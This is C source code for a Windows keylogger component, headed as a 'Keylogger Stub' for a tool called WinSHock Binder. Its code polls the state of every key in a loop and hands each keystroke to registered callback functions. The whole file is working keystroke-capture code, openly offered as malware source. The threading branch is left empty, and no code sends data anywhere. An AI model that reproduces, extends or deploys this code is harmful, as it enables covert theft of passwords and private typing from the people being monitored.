// WinSHock Binder (WsBind) Keylogger Stub
// @idigitalflame

typedef void (*KeyFunction)(unsigned char);

typedef struct KEYLISTENER
{
    int count;
    int maxSize;
    KeyFunction *functions;
} KeyListener;

void __wsk_start_scan(int wsScanDuration);
void __wsk_notify_key(unsigned char wsKey);

KeyListener KEY_ARRAY;

int wsk_register_size(int wsSize)
{
    if(wsSize >= KEY_ARRAY.count)
    {
        KeyFunction *function_back = KEY_ARRAY.functions;
        if((KEY_ARRAY.functions = realloc(KEY_ARRAY.functions, wsSize * sizeof(KeyFunction))) == NULL)
        {
            KEY_ARRAY.functions = function_back;
            return KEY_ARRAY.maxSize;
        }
        KEY_ARRAY.maxSize = wsSize;
        return wsSize;
    }
    return KEY_ARRAY.maxSize;
}
void __wsk_start_scan(int wsScanDuration)
{
    short wsKey, wsStatus;
    long wsTime, wsTimeStart = GetTickCount();
    while(1)
    {
        Sleep(20);
        for(wsKey = 8; wsKey <= 222; wsKey++)
        {
            wsStatus = GetAsyncKeyState(wsKey);
            if(wsStatus == -32767 || wsStatus == 1)
            {
                if((wsKey > 64) && (wsKey < 97)) wsKey += 32;
                __wsk_notify_key((unsigned char)wsKey);
            }
        }
        if(wsScanDuration > 0)
        {
            wsTime = GetTickCount();
            if(wsTime <= 0) break;
            if(wsTime - wsTimeStart >= wsScanDuration) break;
        }
    }
}
void __wsk_notify_key(unsigned char wsKey)
{
    int wsStart;
    for(wsStart = 0; wsStart < KEY_ARRAY.count; wsStart++)
        KEY_ARRAY.functions[wsStart](wsKey);
}
int wsk_register_listener(KeyFunction wsFunction)
{
    if(KEY_ARRAY.count == KEY_ARRAY.maxSize || (KEY_ARRAY.count + 1) > KEY_ARRAY.maxSize)
    {
        KeyFunction *function_back = KEY_ARRAY.functions;
        if(KEY_ARRAY.maxSize == 0) KEY_ARRAY.maxSize = 1;
        if((KEY_ARRAY.functions = realloc(KEY_ARRAY.functions, KEY_ARRAY.maxSize * 2 * sizeof(KeyFunction))) == NULL)
        {
            KEY_ARRAY.functions = function_back;
            return 0;
        }
        KEY_ARRAY.maxSize *= 2;
    }
    KEY_ARRAY.functions[KEY_ARRAY.count++] = wsFunction;
    return 1;
}
HANDLE wsk_start_scan(int wsThreaded, int wsScanDuration)
{
    if(wsThreaded)
    {

    }
    __wsk_start_scan(wsScanDuration);
    return NULL;
}
